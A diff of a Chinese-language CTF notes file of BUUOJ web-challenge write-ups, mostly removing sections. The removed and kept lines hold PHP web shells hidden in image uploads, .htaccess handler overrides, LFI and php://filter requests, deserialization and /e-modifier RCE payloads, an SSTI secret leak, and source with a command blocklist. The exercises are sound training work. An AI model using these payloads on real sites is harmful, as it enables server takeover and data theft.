@@ -21,6 +21,7 @@ tags:
 3. [中文电码](http://code.mcdvisa.com/)
 4. [素数分解](https://factordb.com/)
 5. [Playfair](https://rumkin.com/tools/cipher/playfair/)
+6. [MD5 collisions](https://github.com/corkami/collisions?spm=5176.28103460.0.0.72ab6308WVILLI)
 
 # Linux(Ubuntu)下下载的文件乱码问题（Crypto中特别多）
 1. 查看文件编码
@@ -42,20 +43,7 @@ iconv -f GBK -t UTF-8 乱码文件.txt -o 正常文件_utf8.txt
 ```
 
 ## Basic
-### [1 LFI COURSE 1](https://buuoj.cn/challenges#BUU%20LFI%20COURSE%201)
-```php
-highlight_file(__FILE__);
 
-if(isset($_GET['file'])) {
-    $str = $_GET['file'];
-
-    include $_GET['file'];
-}
-```
-直接在Get请求中加入file=flag参数即可
-```sh
-GET /?file=/flag HTTP/1.1
-```
 ### [2 BRUTE 1](https://buuoj.cn/challenges#BUU%20BRUTE%201)
 用户名试出为admin，密码为四位数字。
 ```sh
@@ -63,65 +51,7 @@ GET /?username=admin&password=1 HTTP/1.1
 ```
 BurpSuite对密码进行爆破
 ### [3 Upload-Labs-Linux](https://buuoj.cn/challenges#Upload-Labs-Linux)
-### [UPLOAD COURSE 1](https://buuoj.cn/challenges#BUU%20UPLOAD%20COURSE%201)
-上传文件，发现会改名成xxx.jpg并储存在uploads上
-写jpg马
-```sh
-echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
-```
-访问
-```
-GET /index.php?file=uploads/6939648e99d96.jpg&cmd=cat%20upload.php HTTP/1.1
-```
-得到upload的代码
-```php
-<?php
-/**
- * Created by PhpStorm.
- * User: jinzhao
- * Date: 2019/7/9
- * Time: 7:54 AM
- */
 
-
-if(isset($_FILES['upload_file'])) {
-    @mkdir("uploads/");
-
-
-    $filename = uniqid().".jpg";
-    move_uploaded_file($_FILES["upload_file"]["tmp_name"],
-        "uploads/" . $filename);
-    echo "æä»¶å·²å¨å­å¨: " . "uploads/" . $filename;
-}
-
-?>
-```
-再看index.php的代码
-```php
-<?php
-/**
- * Created by PhpStorm.
- * User: jinzhao
- * Date: 2019/7/9
- * Time: 7:07 AM
- */
-
-if(isset($_GET['file'])) {
-    $re = '/^uploads\/[\d|\w]*.jpg$/m';
-    $str = $_GET['file'];
-
-    preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);
-
-    if(count($matches) == 0 && $_GET['file'] !== 'upload.php') {
-        die('ä½ ä¸èå®å¦~');
-    }
-
-    include $_GET['file'];
-} else {
-    Header('Location: index.php?file=upload.php');
-}
-```
-最后发现并不需要，只要cmd中传入ls /就能发现有个flag文件，cmd=cat%20/flag可得flag
 ### [Juice Shop](https://buuoj.cn/challenges#Juice%20Shop)
 SQL注入+爆破
 ### [xianzhi_xss](https://buuoj.cn/challenges#xianzhi_xss)
@@ -207,15 +137,7 @@ Content-Type: application/x-www-form-urlencoded
 
 <?php phpinfo(); ?>
 ```
-### [Upload](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload)
-```sh
-GIF89a
-<?php @eval($_POST['cmd']);?>
 
-# 或
-<script language="php">eval($_POST['cmd']);</script>
-```
-使用`<?xxx`的或后缀`.php`的都上传不成功，拦截`<?`或`php`文件，改用`<script`的和`.phtml`的可以，上传到了upload文件夹下。再用AntSword连接得到flag
 
 ### [PHP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)
 ```sh
@@ -362,83 +284,6 @@ phpinfo()页面中显示有个文件`f1444aagggg.php`访问返回`Flag: SYC{w31c
 ```
 GET /f1444aagggg.php HTTP/1.1
 ```
-### [Greatphp](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Greatphp)
-php中md5和sha1的绕过
-```php
-<?php
-class SYCLOVER {
-        public $syc;
-        public $lover;
-}
-// 正则过滤，改用urlencode-decode/xor
-$cmd = "/flag";
-$cmdencode = urlencode(~$cmd);
-echo $cmdencode;
-echo "\n";
-/* <?= ?> 等同于<?php ?> */
-$str = "?><?=include~".urldecode($cmdencode)."?>";
-$cls = new SYCLOVER();
-// 同一行保证message相同，但类本身因错误码不同而不同
-$a = new Error($str, 1);$b = new Error($str, 2); 
-
-$cls->syc = $a; 
-$cls->lover = $b; 
-
-echo urlencode(serialize($cls));
-?>
-```
-### [Roamphp2-Myblog](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
-```
-GET /index.php?page=php://filter/read=convert.Base64-encode/resource=login HTTP/1.1
-
-GET /index.php?page=php://filter/read=convert.Base64-encode/resource=secret HTTP/1.1
-```
-```php
-<?php\nrequire_once("secret.php");\n
-mt_srand($secret_seed);\n
-$_SESSION[\'password\'] = mt_rand();\n?>\n'
-
-<?php\n$secret_seed = mt_rand();\n?>\n
-```
-登录失败页面
-```
-http://c6f1a9dc-119f-4e60-a86d-52adac541ade.node5.buuoj.cn:81/?page=admin/user
-
-GET /index.php?page=php://filter/read=convert.Base64-encode/resource=admin/user HTTP/1.1
-```
-```php
-if (isset($_POST[\'username\']) and isset($_POST[\'password\'])){\n\t
-if ($_POST[\'username\'] === "Longlone" and $_POST[\'password\'] == $_SESSION[\'password\']){  // No one knows my password, including 
-myself\n\t\t
-$logined = true;
-
-<?php
-if(isset($_FILES['Files']) and $_SESSION['status'] === true){
-    $tmp_file = $_FILES['Files']['name'];
-    $tmp_path = $_FILES['Files']['tmp_name'];
-    if(($extension = pathinfo($tmp_file)['extension']) != ""){
-        $allows = array('gif','jpeg','jpg','png');
-        if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
-            $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
-            move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
-            echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
-        } else {
-            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
-        }
-    }
-}
-?>
-```
-login页面产生password -> 登录提交SSID、username和password -> 后台对比password -> 提交抓包置空SSID和password绕过  
-
-phpinfo一句话码.php打包成.zip上传访问，zip://bagname#filename流中的文件都会被当成php，但get遇到#会解析故需要转义
-```
-GET /index.php?page=zip://./assets/img/upload/xxx_uploadname.jpg%23xxx_filename HTTP/1.1
-GET /index.php?page=phar://./assets/img/upload/xxx_uploadname.jpg/xxx_filename HTTP/1.1
-```
-页面均显示空白...  
-
-看了wp都是这个路，但本人尝试多遍均返回空白内容，返回200但Content-Length: 0，暂且记下
 
 ### [Cross](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Cross)
 03页面中得到300个随机数
@@ -1828,19 +1673,7 @@ GET /?file=source.php%253f/../hint.php HTTP/1.1
 
 GET /?file=source.php%253f/../../../../ffffllllaaaagggg HTTP/1.1
 ```
-### [Upload](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload)
-页面提示只能上传jpg,png和gif，上传后会改名但不会改后缀，修改filename用.phtml可上传成功
-```sh
-------WebKitFormBoundarytIH6nB2DbB83MTUp
-Content-Disposition: form-data; name="upload_file"; filename="info.phtml"
-Content-Type: image/gif
 
-GIF89a
-<?php @eval($_POST['cmd']); ?>
-
-------WebKitFormBoundarytIH6nB2DbB83MTUp
-```
-然后使用AntSword连接得到根目录下的flag
 ### [BackupFile](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile)
 使用dirsearch遍历发现有/index.php.bak文件
 ```sh
@@ -1920,192 +1753,8 @@ GET /calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(9
 ```
 ### [admin](https://buuoj.cn/challenges#[HCTF%202018]admin)
 
-### [NiZhuanSiWei](https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei)
-```php
-<?php  
-$text = $_GET["text"];
-$file = $_GET["file"];
-$password = $_GET["password"];
-if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
-    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
-    if(preg_match("/flag/",$file)){
-        echo "Not now!";
-        exit(); 
-    }else{
-        include($file);  //useless.php
-        $password = unserialize($password);
-        echo $password;
-    }
-}
-else{
-    highlight_file(__FILE__);
-}
-?>
-```
-
-```py
-import base64
-b = base64.b64encode(b'welcome to the zjctf').decode()
-print(b)
-d2VsY29tZSB0byB0aGUgempjdGY=
-```
-```sh
-GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1
 
 
-```
-### [easy_tornado](https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado)
-```sh
-hash = md5(cookie_secret+md5(filename))
-```
-已知三组filename和hash并不能算出cookie_secret，也不能算得其它filename对应的hash
-```sh
-GET /error?msg={{handler.settings}} HTTP/1.1
-```
-访问error页面，得到cookie_secret
-```html
-<body>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;95cf769f-f7df-4b9b-ba50-a650d346b6e5&#39;}</body>
-```
-
-```py
-import hashlib
-file = '/fllllllllllllag'
-secret = '95cf769f-f7df-4b9b-ba50-a650d346b6e5'
-m1 = hashlib.md5(file.encode()).hexdigest()
-h = hashlib.md5((secret + m1).encode()).hexdigest()
-print(h)
-```
-### [Ez_bypass](https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass)
-```js
-I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])&&isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) && $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo "can you think twice??"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo "You are not a real hacker!"; } } else{ die('Please input first'); } }Please input first
-```
-get转post，数组绕过md5
-```
-GET /?gg[]=1&id[]=2&passwd[]=1234567 HTTP/1.1
-
-
-POST /?gg[]=1&id[]=2 HTTP/1.1
-......
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 19
-
-passwd=1234567t
-```
-### [AreUSerialz](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz)
-```php
-<?php
-
-include("flag.php");
-
-highlight_file(__FILE__);
-
-class FileHandler {
-
-    protected $op;
-    protected $filename;
-    protected $content;
-
-    function __construct() {
-        $op = "1";
-        $filename = "/tmp/tmpfile";
-        $content = "Hello World!";
-        $this->process();
-    }
-
-    public function process() {
-        if($this->op == "1") {
-            $this->write();
-        } else if($this->op == "2") {
-            $res = $this->read();
-            $this->output($res);
-        } else {
-            $this->output("Bad Hacker!");
-        }
-    }
-
-    private function write() {
-        if(isset($this->filename) && isset($this->content)) {
-            if(strlen((string)$this->content) > 100) {
-                $this->output("Too long!");
-                die();
-            }
-            $res = file_put_contents($this->filename, $this->content);
-            if($res) $this->output("Successful!");
-            else $this->output("Failed!");
-        } else {
-            $this->output("Failed!");
-        }
-    }
-
-    private function read() {
-        $res = "";
-        if(isset($this->filename)) {
-            $res = file_get_contents($this->filename);
-        }
-        return $res;
-    }
-
-    private function output($s) {
-        echo "[Result]: <br>";
-        echo $s;
-    }
-
-    function __destruct() {
-        if($this->op === "2")
-            $this->op = "1";
-        $this->content = "";
-        $this->process();
-    }
-
-}
-
-function is_valid($s) {
-    for($i = 0; $i < strlen($s); $i++)
-        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
-            return false;
-    return true;
-}
-
-if(isset($_GET{'str'})) {
-
-    $str = (string)$_GET['str'];
-    if(is_valid($str)) {
-        $obj = unserialize($str);
-    }
-
-}
-```
-反序列化，但不能用protected，改用public可以
-```php
-<?php
-class FileHandler {
-    protected $op = 2;
-    protected $filename = "flag.php";
-    protected $content;
-}
-$Handler = new FileHandler();
-echo serialize($Handler)
-?>
-```
-```sh
-GET /?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} HTTP/1.1
-```
-### [BabyUpload](https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload)
-上传后缀不能包含`ph`，类型必须是`image/jpeg`，文件内容不能有<php ?>标识。故考虑先上传.htaccess
-```sh
-<FilesMatch "shell">
-SetHandler application/x-httpd-php
-</FilesMatch>
-```
-再直接上传图像马
-```php
-------WebKitFormBoundaryTPmfk7bmf17P7r0z
-Content-Disposition: form-data; name="uploaded"; filename="shell.jpg"
-Content-Type: image/jpeg
-
-<script language="php">eval($_POST['cmd']);</script>
-```
-使用AntSword工具即可
 ### [Blacklist](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)
 ```sql
 1 or extractvalue(1, (select database()) )
@@ -2254,91 +1903,62 @@ Content-Type: application/x-www-form-urlencoded
 
 param1[]=1&param2[]=1t 
 ```
-### [Submit](https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2)
-类型只接收Content-Type: image/jpeg，考虑先上传.htaccess
+### [easy_tornado](https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado)
 ```sh
-<FilesMatch "shell">
-SetHandler application/x-httpd-php
-</FilesMatch>
+hash = md5(cookie_secret+md5(filename))
 ```
-再上传shell.jpg
-```php
-<?php system($_GET["cmd"]); ?>
+已知三组filename和hash并不能算出cookie_secret，也不能算得其它filename对应的hash
+```sh
+GET /error?msg={{handler.settings}} HTTP/1.1
 ```
-用AntSward连接。。。不知道什么原因一直连不上。。。
-### [Had a bad day](https://buuoj.cn/challenges#[BSidesCF%202020]Had%20a%20bad%20day)
-文件包含漏洞
+访问error页面，得到cookie_secret
+```html
+<body>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;95cf769f-f7df-4b9b-ba50-a650d346b6e5&#39;}</body>
 ```
-GET /index.php?category=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
-```
-```php
- <?php
-				$file = $_GET['category'];
 
-				if(isset($file))
-				{
-					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
-						include ($file . '.php');
-					}
-					else{
-						echo "Sorry, we currently only support woofers and meowers.";
-					}
-				}
-				?>
+```py
+import hashlib
+file = '/fllllllllllllag'
+secret = '95cf769f-f7df-4b9b-ba50-a650d346b6e5'
+m1 = hashlib.md5(file.encode()).hexdigest()
+h = hashlib.md5((secret + m1).encode()).hexdigest()
+print(h)
 ```
+### [easy_web](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_web)
+```sh
+GET /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd= HTTP/1.1
 ```
-GET /index.php?category=woofers/../flag HTTP/1.1
-```
-### [不过如此](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
+`TXpVek5UTTFNbVUzTURabE5qYz0`->base64->base64->ascii hex->`555.png`，反向操作`index.php`得到源码
 ```php
 <?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header('content-type:text/html;charset=utf-8');
+$cmd = $_GET['cmd'];
+if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
+    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
+$file = hex2bin(base64_decode(base64_decode($_GET['img'])));
 
-error_reporting(0);
-$text = $_GET["text"];
-$file = $_GET["file"];
-if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
-    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
-    if(preg_match("/flag/",$file)){
-        die("Not now!");
+$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
+if (preg_match("/flag/i", $file)) {
+    echo '<img src ="./ctf3.jpeg">';
+    die("xixiï½ no flag");
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
+    echo "<br>";
+}
+echo $cmd;
+echo "<br>";
+if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
+    echo("forbid ~");
+    echo "<br>";
+} else {
+    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
+        echo `$cmd`;
+    } else {
+        echo ("md5 is funny ~");
     }
+}
 
-    include($file);  //next.php
-    
-}
-else{
-    highlight_file(__FILE__);
-}
 ?>
 ```
-```
-GET /?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1
-```
-```php
-<?php
-$id = $_GET['id'];
-$_SESSION['id'] = $id;
-
-function complex($re, $str) {
-    return preg_replace(
-        '/(' . $re . ')/ei',
-        'strtolower("\\1")',
-        $str
-    );
-}
-
-
-foreach($_GET as $re => $str) {
-    echo complex($re, $str). "\n";
-}
-
-function getFlag(){
-	@eval($_GET['cmd']);
-}
-
-```
-```
-GET /next.php?\S*=${getFlag()}&cmd=system('ls%20/'); HTTP/1.1
-
-GET /next.php?\S*=${getFlag()}&cmd=system('cat%20/flag'); HTTP/1.1
-```
-### []()
